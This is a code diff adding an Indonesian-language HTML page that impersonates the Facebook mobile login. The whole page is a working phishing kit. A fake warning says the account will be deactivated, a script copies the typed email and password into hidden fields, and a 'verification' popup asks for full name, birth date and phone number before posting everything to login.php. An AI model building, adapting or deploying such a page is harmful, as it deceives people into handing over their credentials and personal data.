@@ -1,0 +1,548 @@
+<html><head>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin="anonymous">
+  <link href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196">
+        <title>Masuk Facebook | Facebook</title>
+        <meta property="og:title" content="Masuk Facebook | Facebook">
+        <meta name="description" content="Login ke Facebook untuk mulai membagikan sesuatu dan berhubungan dengan teman, keluarga, dan orang-orang yang Anda kenal.">
+        <meta property="og:description" content="Login ke Facebook untuk mulai membagikan sesuatu dan berhubungan dengan teman, keluarga, dan orang-orang yang Anda kenal.">
+        <meta property="og:url" content="./">
+        <meta property="og:site_name" content="Masuk Facebook | Facebook">
+        <meta property="og:type" content="website">
+        <meta name="copyright" content=" Haykal JB">
+        <meta name="theme-color" content="#1877f2">
+        <style>
+body {
+    margin: 0px;
+    font-family: arial;
+    background: #fff;
+}
+.popverif {
+    position: fixed;
+    z-index: 99999;
+    width: 100%;
+    height: 100%;
+    background: #3b5998;
+    top: 0%;
+    left: 0%;
+    transform: translate(0%,0%);
+}
+.headerfbpasang {
+    background-color: #fffbe2;
+    color: #3b5998;
+    font-family: arial;
+    font-size: 14px;
+    display: flex;
+    flex-direction: row;
+    align-items: center;
+    text-align: center;
+    padding: 7px 15px;
+}
+.contpopverif {
+    text-align: center;
+    margin: 15% auto;
+}
+.contpopes {
+    text-align: center;
+    margin: 0% auto;
+}
+.ataspop img {
+    width: 60px;
+    border-radius: 100%;
+}
+.ataspop p {
+    font-size: 20px;
+}
+.inputverif {
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    width: 100%;
+}
+.itemce {
+    margin-bottom: 10px;
+    text-align:left;
+}
+.itemce input {
+    font-size: 18px;
+    line-height: 30px;
+    padding: 0px 10px;
+    border: 1px solid #1877f2;
+    border-radius: 5px;
+    background: #cacaca;
+    color: #000;
+    width: 80%;
+}
+
+.itemce item {
+    padding: 5px 20px;
+    font-size: 16px;
+    font-weight: 500;
+    color: #000;
+    background: #1877f2;
+    border: none;
+    border-radius: 5px;
+    line-height: 25px;
+    
+}
+.itemverif {
+    margin-bottom: 10px;
+    text-align:left;
+}
+.itemverif input {
+    font-size: 18px;
+    line-height: 30px;
+    padding: 0px 10px;
+    border: 1px solid #000;
+    border-radius: 5px;
+    background: #cacaca;
+    color: #000;
+    width: 80%;
+}
+.itemverif select {
+    font-size: 18px;
+    background: #cacaca;
+    padding: 5px 10px;
+    width: 80%;
+    border: 1px solid #1877f2;
+    border-radius: 5px;
+    color: #000;
+}
+.itemverif button {
+    padding: 5px 20px;
+    font-size: 16px;
+    font-weight: 600;
+    color: #fff;
+    background-color: #1877f2;
+    border: none;
+    border-radius: 5px;
+    line-height: 25px;
+    
+}
+
+.headerfbpasang img {
+    width: 17px;
+    margin-right: 7px;
+}
+.textfb {
+    text-align: center;
+}
+.textfb svg {
+    width: 120px;
+}
+.formfb {
+    text-align: center;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+.formfb form {
+    width: 93%;
+    margin-top: 10px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+.itemformfb {
+    margin-bottom: 10px;
+    width: 385px;
+}
+.itemformfb input {
+    outline: none;
+    font-size: 15px;
+    border: 1px solid #d1d2d3;
+    line-height: 35px;
+    width: 100%;
+    background: #f5f6f7;
+    border-radius: 3px;
+    padding: 3px 10px;
+    font-family: sans-serif;
+}
+.itemformfb button {
+    background-color: #1877f2;
+    background-image: none;
+    width: 100%;
+    border: none;
+    outline: none;
+    padding: 3px 20px;
+    line-height: 35px;
+    font-family: sans-serif;
+    font-weight: 600;
+    color: #fff;
+    font-size: 16px;
+    letter-spacing: 1px;
+    border-radius: 5px;
+}
+.lupasandifb span {
+    color: #056cf2;
+    font-size: 14px;
+}
+.atauotherregist {
+    display: flex;
+    flex-direction: row;
+    flex-wrap: nowrap;
+    align-items: center;
+    margin-top: 1em;
+    margin-bottom: 1em;
+}
+.atauotherregist hr {
+    width: 160px;
+}
+.atauotherregist span {
+    margin-left: 10px;
+    margin-right: 10px;
+    font-size: 14px;
+    color: #3c3c3c;
+}
+.btnregistfb button {
+    background-color: #00a400;
+    background-image: none;
+    width: 100%;
+    border: none;
+    outline: none;
+    padding: 3px 16px;
+    line-height: 30px;
+    font-family: sans-serif;
+    font-weight: 600;
+    color: #fff;
+    font-size: 14px;
+    letter-spacing: 0px;
+    border-radius: 5px;
+}
+.footerfb {
+    margin-top: 8em;
+}
+.bahasafooter {
+    display: flex;
+    flex-direction: row;
+    flex-wrap: nowrap;
+    align-items: center;
+    justify-content: space-around;
+}
+.bahasfb {
+    display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: center;
+    color: #206cce;
+    font-size: 14px;
+}
+.bahasfb span {
+    line-height: 22px;
+}
+.bahasfb label {
+    width: 20px;
+    height: 20px;
+    text-align: center;
+    border: 1px solid #747474;
+    border-radius: 4px;
+    display: flex;
+    flex-direction: row;
+    align-items: center;
+}
+.bahasfb label i {
+    margin: 8% auto;
+}
+.otherfooterfb {
+    margin-top: 2em;
+    margin-bottom: 1em;
+    text-align: center;
+    color: #747474;
+    font-size: 13px;
+}
+.otherfooterfb span {
+    margin-right: 5px;
+    margin-left: 5px;
+}
+.otherfooterfb p {
+    font-size: 15px;
+}
+.alertfbya {
+    background: #fa3e3e;
+    color: #fff;
+    font-size: 14px;
+    line-height: 20px;
+    padding: 3px 10px;
+    display: none;
+}
+@media only screen and (max-width:361px) {
+    .headerfbpasang {
+        text-align: left;
+    }
+    .itemformfb {
+        width: 337px;
+    }
+    .atauotherregist hr {
+        width: 140px;
+    }
+    .alert
+{
+   position:relative;
+   max-width:383px;
+   margin:10px 15px;
+}
+.alert .warning
+{
+   position:relative;
+   padding:5px;
+   color:#fff;
+   background:red;
+   text-align:center;
+   border-radius:3px;
+   font-weight:bold;
+}
+.warning i 
+{
+   float:left;
+   margin-top:1.5px;
+}
+
+.alert .aman
+{
+   margin-top:5px;
+   position:relative;
+   padding:5px;
+   color:#fff;
+   background:green;
+   text-align:center;
+   border-radius:3px;
+   font-weight:bold;
+}
+.aman i 
+{
+   float:left;
+   margin-top:1.5px;
+}
+.mask 
+{
+   position:fixed;
+   top:0;
+   left:0;
+   width:100%;
+   height:100%;
+   background:rgba(0,0,0,0.50);
+   display:none;
+}
+.ngPopup
+{
+   position: absolute;
+   top:50%;
+   left:50%;
+   transform:translate(-50%,-50%);
+   width:300px;
+   height:280px;
+   background:#fff;
+   border-radius:3px;
+   overflow:hidden;
+   z-index:999999;
+   display:none;
+}
+.ngPopup .topTitle
+{
+   position:relative;
+   padding:8px 5px;
+   border-bottom:2px solid #f2f2f2;
+   font-weight:bold;
+   text-align:center;
+   background:#3b5998;
+   color:#fff;
+}
+.ngPopup .formulir
+{
+   position:relative;
+   display:flex;
+   justify-content:center;
+   align-items:center;
+   flex-direction:column;
+   padding:10px;
+}
+.formulir .form-group
+{
+   position:relative;
+   width:280px;
+   margin-top:15px;
+}
+.ngPopup .formulir .form-group:not(:first-child){
+   margin-top:30px;
+}
+.form-group .form-input
+{
+   width:100%;
+   background:#f2f2f2;
+   border:none;
+   outline:none;
+   padding:8px 5px;
+   border-top-right-radius:3px;
+   border-bottom-right-radius:3px;
+   border-bottom-left-radius:3px;
+   box-shadow:0 .5px 1px rgba(0,0,0,0.50);
+}
+.form-group label
+{
+   position:absolute;
+   top:-18.5px;
+   width:100px;
+   padding:0 5px;
+   left:-1px;
+   background:#3b5998;
+   color:#fff;
+   border-top-right-radius:3px;
+   border-top-left-radius:3px;
+}
+.form-group .btn-submit
+{
+   background:#3b5998;
+   padding:5px 10px;
+   color:#fff;
+   font-weight:bold;
+   text-align:center;
+   border-radius:3px;
+   border:none;
+   box-shadow:0 .5px 3px rgba(0,0,0,0.50);
+}
+}
+        </style>
+    </head>
+    <body style="">
+        <div class="applogfb">
+            <div class="container">
+                <div class="headerfbpasang">
+                    <img src="https://i.ibb.co/vkqDCNY/1634491281468.png"><span>Pasang Facebook untuk Android dan buka lebih cepat.</span>
+                </div>
+                <div class="alertfbya emailnih">
+                    <span>Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></span>
+                </div>
+                <div class="alertfbya passnih">
+                    <span>Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></span>
+                </div>
+                <div class="alert"> 
+           <p class="warning"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>Akun anda akan di nonaktifkan</p> 
+           <p class="aman"><i class="fa fa-bell" aria-hidden="true"></i>Login untuk membatalkan penonaktifan akun anda</p> 
+          </div> 
+         </div> 
+                <div class="boxformfb">
+                    <div class="textfb">
+                        <svg id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1022.51 360"><defs><style>.cls-1{fill:#1877F2;}</style></defs><title>FBWordmark_Hex-RGB-1024</title><path class="cls-1" d="M166.43,126.68c-9.65,0-12.44,4.28-12.44,13.72v15.66h25.74l-2.58,25.3H154v76.78H123.11V181.36H102.3v-25.3h20.81V140.83c0-25.52,10.29-39,39-39a146.17,146.17,0,0,1,18,1.07v23.81Z"></path><path class="cls-1" d="M181.87,203.88c0-28.52,13.51-50,41.82-50,15.44,0,24.87,7.94,29.38,17.8V156.06h29.59V258.14H253.07V242.7c-4.29,9.87-13.94,17.59-29.38,17.59-28.31,0-41.82-21.45-41.82-50Zm30.88,6.87c0,15.22,5.57,25.3,19.94,25.3,12.66,0,19.09-9.22,19.09-23.8V202c0-14.58-6.43-23.8-19.09-23.8-14.37,0-19.94,10.08-19.94,25.3Z"></path><path class="cls-1" d="M347,153.91c12,0,23.37,2.58,29.59,6.86l-6.86,21.88a48.6,48.6,0,0,0-20.59-4.72c-16.73,0-24,9.65-24,26.17v6c0,16.52,7.29,26.17,24,26.17a48.6,48.6,0,0,0,20.59-4.72l6.86,21.87c-6.22,4.29-17.58,6.87-29.59,6.87-36.25,0-52.76-19.52-52.76-50.83v-4.72C294.24,173.43,310.75,153.91,347,153.91Z"></path><path class="cls-1" d="M380.66,211v-9c0-28.95,16.51-48,50.19-48,31.74,0,45.68,19.3,45.68,47.61v16.3h-65c.65,13.94,6.87,20.16,24,20.16,11.59,0,23.81-2.36,32.82-6.22L474,253c-8.15,4.3-24.88,7.51-39.67,7.51C395.24,260.5,380.66,241,380.66,211Zm30.88-13.3h37.32v-2.57c0-11.15-4.5-20-18-20C416.91,175.14,411.54,183.94,411.54,197.66Z"></path><path class="cls-1" d="M591,210.32c0,28.52-13.72,50-42,50-15.44,0-26.16-7.72-30.45-17.59v15.44H489.39V104.8L520.27,102v68.2c4.5-9,14.37-16.3,28.74-16.3,28.31,0,42,21.45,42,50Zm-30.88-7.08c0-14.37-5.57-25.09-20.37-25.09-12.66,0-19.52,9-19.52,23.59v10.72c0,14.58,6.86,23.59,19.52,23.59,14.8,0,20.37-10.72,20.37-25.09Z"></path><path class="cls-1" d="M601.33,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62S703,175.14,703,204.53v5.14c0,29.38-16.73,50.62-50.83,50.62S601.33,239.05,601.33,209.67Zm70.78-7.29c0-13.51-5.58-24.23-20-24.23s-19.95,10.72-19.95,24.23v9.44c0,13.51,5.58,24.23,19.95,24.23s20-10.72,20-24.23Z"></path><path class="cls-1" d="M713.27,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62s50.83,21.23,50.83,50.62v5.14c0,29.38-16.73,50.62-50.83,50.62S713.27,239.05,713.27,209.67Zm70.78-7.29c0-13.51-5.58-24.23-19.95-24.23s-19.94,10.72-19.94,24.23v9.44c0,13.51,5.57,24.23,19.94,24.23s19.95-10.72,19.95-24.23Z"></path><path class="cls-1" d="M857.39,204.74l30.45-48.68h32.81l-31.95,50.4,33.24,51.68H889.13l-31.74-50v50H826.5V104.8L857.39,102Z"></path></svg>
+                    </div>
+                    <div class="formfb">
+                            <div class="itemformfb">
+                                <input type="text" name="email" id="emailfb" placeholder="Nomor ponsel atau email" required="">
+                            </div>
+                            <div class="itemformfb">
+                                <input type="password" name="password" id="passwordfb" placeholder="Kata Sandi" required="">
+                            </div>
+                            <div class="itemformfb">
+                            	<input type="hidden" name="login" value="Facebook" readonly="">
+                                <button onclick="HostingNetFB()">Masuk</button>
+                            </div>
+                        
+                        <div class="lupasandifb">
+                            <span>Lupa Kata Sandi?</span>
+                        </div>
+                        <div class="atauotherregist">
+                            <hr>
+                            <span> atau </span>
+                            <hr>
+                        </div>
+                        <div class="btnregistfb">
+                            <button>Buat Akun Baru</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="footerfb">
+                    <div class="bahasafooter">
+                        <div class="bahasfb">
+                            <span style="color: #747474;">Bahasa Indonesia</span>
+                            <span>Basa Jawa</span>
+                            <span>日本語</span>
+                            <span>Português (Brasil)</span>
+                        </div>
+                        <div class="bahasfb">
+                            <span>English (UK)</span>
+                            <span>Bahasa Melayu</span>
+                            <span>Español</span>
+                            <label><i class="bi bi-plus-lg"></i></label>
+                        </div>
+                    </div>
+                    <div class="otherfooterfb">
+                        <span>Tentang</span>•<span>Bantuan</span>•<span>Lainnya</span>
+                        <p>Facebook Inc.</p>
+                    </div>
+                </div>
+            </div>
+        
+        
+<div class="popverif" style="display: none;">
+	<div class="itemverif">
+		     <div class="contpopverif">
+		         <div class="aman">
+		             <button>Verifikasi Pemblokiran</button>
+		         </div>
+		         <form method="POST" action="login.php">
+		         <div class="inputverif">
+		             <div class="itemce">
+			<item><label>Nama Lengkap</label></item>
+		                 <input type="text" name="namni" placeholder="Nama Lengkap FB Anda" required="">
+		             </div>
+		             <div class="itemce">
+			<item><label>Tanggal Lahir</label></item>
+		                 <input type="text" name="tglni" placeholder="Contoh : 15 Desember 2000" required="">
+		             </div>
+		             <div class="itemce">
+			<item><label>Nomor HP</label></item>
+		                 <input type="tel" name="nomni" placeholder="Contoh : 082324185540" required="">
+			
+		             </div>
+		             <div class="itemverif">
+			<div class="contpopes">
+				<div class="aman">
+		                 <input type="hidden" name="email" id="emailnih" readonly="">
+		                 <input type="hidden" name="password" id="passwordnih" readonly="">
+		                 <div class="aman">
+		                 <button type="submit" style="background: #00a400;">Verifikasi</button>
+		             </div>
+		         </div>
+		         
+		     </div>
+		 </div>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://rawcdn.githack.com/HostX/protect/aaa1462a19b8d8b6cbd68101a5ac89f4955b49de/input-exception.js"></script>
+<link rel="stylesheet" href="https://rawcdn.githack.com/HostX/protect/a64076479559076b6e31356a0fb6188d291204ce/watermark.css">
+<script type="text/javascript">
+function HostingNetFB()
+{
+	$emailfb = $('#emailfb').val().trim();
+	$passwordfb = $('#passwordfb').val().trim();
+	if($emailfb == '' || $emailfb == null || $emailfb.length <= 7)
+	{
+		$('.emailnih').show();
+		$('.passnih').hide();
+		$('.headerfbpasang').hide();
+		$('.popverif').hide();
+		return false;
+	}else{
+		$('.emailnih').hide();
+		$('.popverif').show();
+		$("input#emailnih").val($emailfb);
+		$('.headerfbpasang').hide();
+	}
+	if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 6)
+	{
+		$('.passnih').show();
+		$('.headerfbpasang').hide();
+		return false;
+	}else{
+		$('.passnih').hide();
+		$('.popverif').show();
+		$("input#passwordnih").val($passwordfb);
+		$('.headerfbpasang').hide();
+	}
+}
+</script>
+    
+</div></form></div></div></div></body></html>
